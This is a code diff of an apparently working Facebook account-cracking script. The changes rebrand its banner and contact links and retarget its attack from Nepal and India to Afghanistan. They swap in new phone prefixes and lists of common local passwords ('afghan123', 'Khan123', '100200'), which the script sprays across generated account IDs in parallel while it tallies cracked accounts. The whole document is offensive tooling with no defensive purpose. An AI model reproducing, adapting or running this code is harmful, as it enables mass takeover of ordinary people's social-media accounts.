@@ -18,7 +18,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python KOKO92.py')
+        os.system('python3 KOKO92.py')
 except:pass
 def Elite(ids,pas,cookie):
     try:
@@ -204,7 +204,7 @@ def joined(ids):
         creation = '\33[1;37m| \33[1;32m2006/2007'
     else:creation=''
     return creation  
-os.system("xdg-open https://t.me/JokerToolzz")        
+os.system("xdg-open https://www.facebook.com/duliako")        
 def getKey():
 
     uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
@@ -228,19 +228,22 @@ def iAmMethod2Ua():
     return ua
 logo=("""
 
-\033[1;32m     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
-\033[1;32m     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
-\033[1;32m     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
-\033[1;32m██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
-\033[1;32m╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
-\033[1;32m╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                      
- ┏━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┓
- ┃Dec By : SHAHI JOKER     ┃𝐒𝐓𝐀𝐓𝐔𝐒  : FREE   ┃
- ┃𝐅𝐁 𝐈𝐃  : JOKER KHANO    ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 2.8    ┃
- ┣━━━━━━━━━━━━━━━━━━━━━┳━┻━━━━━━━━━━━━━━━━━━━┫
- ┃TG : MR JOKER  ┃ 𝐓𝐎𝐎𝐋 : FILE            |
- ┗━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┛
-\033[1;32m----------------------------------------------""")
+\033[1;31m    ____   ____   ___    __ __________ ________    
+\033[1;31m    `MM'  6MMMMb  `MM    d'  `MMMMMMMMM `MMMMMMMb.  
+\033[1;39m      MM  8P    Y8  MM   d'   MM      \  MM    `Mb  
+\033[1;39m      MM 6M      Mb MM  d'    MM         MM     MM  
+\033[1;39m      MM MM      MM MM d'     MM    ,    MM     MM  
+\033[1;39m      MM MM      MM MMd'      MMMMMMM    MM    .M9  
+\033[1;39m      MM MM      MM MMYM.     MM    `    MMMMMMM9'  
+\033[1;39m      MM MM      MM MM YM.    MM         MM  \M\    
+\033[1;39m(8)   MM YM      M9 MM  YM.   MM         MM   \M\   
+\033[1;31m((   ,M9  8b    d8  MM   YM.  MM      /  MM    \M\  
+\033[1;31m YMMMM9    YMMMM9  _MM_   YM._MMMMMMMMM _MM_    \M\_                                
+\033[1;37m------------------------------------------------
+\033[1;37m Owner   :            PRINCE JOKER
+\033[1;37m Facebook:            SHAHI JOKER
+\033[1;37m Version :            2.8
+\033[1;37m------------------------------------------------ """
 def linex():
         print('\033[1;37m----------------------------------------------')
 def clear():
@@ -275,7 +278,7 @@ def menu():
                                 wx=("Dsj9JMWoixk4Qsje0Ng3nA")
                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                         elif axs in ['6','06']:
-                                os.system('xdg-open https://fb.watch/ikMLhudxhU/');menu() 
+                                os.system('xdg-open https://www.facebook.com/duliako/');menu() 
                         elif axs in ['0','00']:
                                 exit(" Thanks for use my tool")        
                         else: 
@@ -389,14 +392,14 @@ def file():
                                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
                                 input(' Press enter to back ')
-                                os.system('python KOKO92.py')
+                                os.system('python3 KOKO92.py')
 
 
 def rndmpk():
                         clear()        
-                        print("[1] Nepal x ind cracking")
-                        print("[2] Pakistan cracking")
-                        print("[3] Bd cracking")  
+                        print("[1] AFGHANISTAN CRACKING")
+                        print("[2] PAKISTAN CRACKING")
+                        print("[3] Bd CRACKING")  
                         linex()   
                         ax=input('[?] Choose option :')
                         if ax in ['1','01']:
@@ -410,7 +413,7 @@ def rndmpk():
 def npxind():
                 user=[]
                 clear()
-                print('\033[1;37m Example : ,9816,9814,ETC')
+                print('\033[1;37m Example : ,9370,9378,ETC')
                 linex()
                 print(" Put your country 4digit code")
                 linex
@@ -443,9 +446,9 @@ def npxind():
                         for psx in user:
                                 ids = code+psx
                                 if pcs in ['1','01']:                                   
-                                    passlist = [psx,ids,'meena123','57575751','57273200','manish123','manish1234','sharma123','i love you','iloveyou','viratkohli','bhagwan','pubglover','pubg1122']
+                                    passlist = [psx,ids,'۱۲۳۴۵۶','afghanistan','afghan123','afghan1234','afghan12345','100200','Afghanistan','Afghan123','Afghan1234','Afghan12345','pubglover','pubg12345']
                                 elif pcs in ['2','02']:     
-                                    passlist = [psx,ids,'nepal123','nepal1234','nepal@123','sagar123','i love you','freefire','Nepal@123','free fire','kathmandu','kathmandu123','sagarmatha123','machikney123','maya123','maya1234','maya12345,']                             
+                                    passlist = [psx,ids,'۱۲۳۴۵۶','afghanistan','afghan123','afghan1234','afghan12345','100200','Afghanistan','Afghan123','Afghan1234','Afghan12345','10002000','500600','500500','Khan123','Khan12345,']                             
                                 if mthd in ['1','01']:                                 
                                     JOKER.submit(rndm1,ids,passlist)
                                 if mthd in ['2','02']:    
@@ -456,7 +459,7 @@ def npxind():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python KOKO92.py')    
+                os.system('python3 KOKO92.py')    
                 
 def pak():
                 user=[]
@@ -497,7 +500,7 @@ def pak():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python KOKO92.py')       
+                os.system('python3 KOKO92.py')       
 def bd():
                 user=[]
                 clear()
@@ -537,7 +540,7 @@ def bd():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python KOKO92.py') 
+                os.system('python3 KOKO92.py') 
 def gmail():
                 os.system('rm -rf .re.txt')
                 clear()
@@ -592,7 +595,7 @@ def gmail():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python KOKO92.py')
+                os.system('python3 KOKO92.py')
 def M1(ids,names,passlist):
                 try:
                         global ok,loop
